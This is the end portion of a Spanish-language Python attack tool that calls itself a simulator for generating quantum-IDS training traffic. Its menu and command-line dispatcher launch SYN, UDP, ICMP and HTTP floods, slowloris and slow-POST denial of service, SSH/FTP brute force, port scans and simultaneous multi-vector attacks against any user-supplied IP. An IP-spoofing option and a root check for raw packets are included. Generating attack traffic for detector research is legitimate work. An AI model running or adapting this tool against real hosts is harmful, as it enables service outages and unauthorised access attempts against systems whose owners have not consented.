        elif opcion == '7':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 80): ") or "80"
            duracion = input("Duracion en segundos (default 30): ") or "30"
            n_con = input("Numero de conexiones (default 50): ") or "50"
            generador.dos_slow_post(ip, int(puerto), int(duracion), int(n_con))

        elif opcion == '8':
            ip = input("IP objetivo: ")
            servicio = input("Servicio (ssh/ftp, default ssh): ") or "ssh"
            puerto = input("Puerto objetivo (default 22): ") or "22"
            duracion = input("Duracion en segundos (default 20): ") or "20"
            tasa = input("Intentos por segundo (default 5): ") or "5"
            generador.fuerza_bruta_simulada(ip, int(puerto), servicio, int(duracion), int(tasa))

        elif opcion == '9':
            ip = input("IP objetivo: ")
            puerto = input("Puerto objetivo (default 80): ") or "80"
            duracion = input("Duracion en segundos (default 20): ") or "20"
            tasa = input("Requests por segundo (default 50): ") or "50"
            generador.http_flood_l7(ip, int(puerto), int(duracion), int(tasa))

        elif opcion == '10':
            ip = input("IP objetivo: ")
            n = input("Numero de instancias simultaneas (default 4): ") or "4"
            ataques = _generar_ataques_multivector_ejemplo(ip, int(n))
            print(f"\nSe lanzaran {len(ataques)} instancias EN SIMULTANEO:")
            for i, a in enumerate(ataques):
                print(f"   {i + 1}. {a['tipo']} -> {a['target_ip']} ({a['duracion']}s)")
            if input("\nContinuar? (s/n): ").lower() == 's':
                gestor.ejecutar_multivector(ataques)

        elif opcion == '11':
            ruta = input("Ruta al archivo JSON de escenario: ")
            try:
                ataques = GestorMultiVector.cargar_escenario(ruta)
                if input(f"Se cargaron {len(ataques)} instancias. Continuar? (s/n): ").lower() == 's':
                    gestor.ejecutar_multivector(ataques)
            except Exception as e:
                print(f"Error cargando escenario: {e}")

        elif opcion == '12':
            ip = input("IP objetivo (trafico de fondo): ")
            duracion = input("Duracion (default 30s): ") or "30"
            intensidad = input("Intensidad (paquetes/s, default 50): ") or "50"
            generador.generar_trafico_fondo(ip, int(duracion), int(intensidad))

        elif opcion == '13':
            print("\nCONFIGURACION ACTUAL:")
            print(f"   Spoofing de IPs: {generador.config['spoofing_ips']}")
            print(f"   Variabilidad de tasa: {generador.config['variabilidad_tasa']}")
            if input("\nCambiar spoofing de IPs? (s/n): ").lower() == 's':
                generador.config['spoofing_ips'] = not generador.config['spoofing_ips']
                print(f"   Spoofing actualizado a: {generador.config['spoofing_ips']}")

        elif opcion == '14':
            print("\nSaliendo del simulador...")
            break
        else:
            print("Opcion invalida")


def main():
    parser = argparse.ArgumentParser(description='Simulador de Ataques v3 para IDS Cuantico')
    parser.add_argument('--modo', choices=['interactivo', 'script'], default='interactivo')
    parser.add_argument('--target', help='IP objetivo')
    parser.add_argument('--tipo', choices=list(GestorMultiVector.TIPOS_SOPORTADOS),
                         help='Tipo de ataque')
    parser.add_argument('--puerto', type=int, default=80, help='Puerto objetivo')
    parser.add_argument('--duracion', type=int, default=10, help='Duracion en segundos')
    parser.add_argument('--tasa', type=int, default=100, help='Tasa de paquetes/segundo')
    parser.add_argument('--servicio', choices=['ssh', 'ftp'], default='ssh',
                         help='Servicio para --tipo bruteforce')
    parser.add_argument('--num-conexiones', type=int, default=100,
                         help='Conexiones para slowloris/slow_post')
    parser.add_argument('--puerto-inicio', type=int, default=1, help='Para --tipo portscan')
    parser.add_argument('--puerto-fin', type=int, default=1024, help='Para --tipo portscan')
    parser.add_argument('--paralelo', type=int, help='Numero de instancias simultaneas aleatorias')
    parser.add_argument('--escenario', help='Ruta a un JSON de escenario multi-vector')

    args = parser.parse_args()

    if args.modo == 'interactivo':
        import os
        if os.geteuid() != 0:
            print("Este script necesita permisos de root para enviar paquetes raw")
            print("Ejecuta: sudo python3 simulador_ataques_v3.py")
            sys.exit(1)
        menu_avanzado()
        return

    # Modo script (automatizacion / generacion de dataset)
    generador = GeneradorAtaqueAvanzado()
    gestor = GestorMultiVector(max_trabajadores=8)

    if args.escenario:
        ataques = GestorMultiVector.cargar_escenario(args.escenario)
        gestor.ejecutar_multivector(ataques)
        return

    if not args.target:
        print("En modo script necesitas --target o --escenario")
        sys.exit(1)

    if args.paralelo:
        ataques = _generar_ataques_multivector_ejemplo(args.target, args.paralelo)
        if args.tipo:
            for a in ataques:
                a['tipo'] = args.tipo
        gestor.ejecutar_multivector(ataques)
        return

    tipo = args.tipo or 'tcp_syn'
    if tipo == 'tcp_syn':
        generador.tcp_syn_flood_avanzado(args.target, args.puerto, args.duracion, args.tasa)
    elif tipo == 'udp':
        generador.udp_flood(args.target, args.puerto, args.duracion, args.tasa)
    elif tipo == 'icmp':
        generador.icmp_flood(args.target, args.duracion, args.tasa)
    elif tipo == 'hibrido':
        generador.ataque_hibrido(args.target, args.duracion, 'media')
    elif tipo == 'portscan':
        generador.escanear_puertos(args.target, args.puerto_inicio, args.puerto_fin, args.duracion, args.tasa)
    elif tipo == 'slowloris':
        generador.dos_slowloris(args.target, args.puerto, args.duracion, args.num_conexiones)
    elif tipo == 'slow_post':
        generador.dos_slow_post(args.target, args.puerto, args.duracion, args.num_conexiones)
    elif tipo == 'bruteforce':
        generador.fuerza_bruta_simulada(args.target, args.puerto, args.servicio, args.duracion, args.tasa)
    elif tipo == 'http_flood':
        generador.http_flood_l7(args.target, args.puerto, args.duracion, args.tasa)
    else:
        print(f"Tipo de ataque no soportado: {tipo}")


if __name__ == "__main__":
    main()

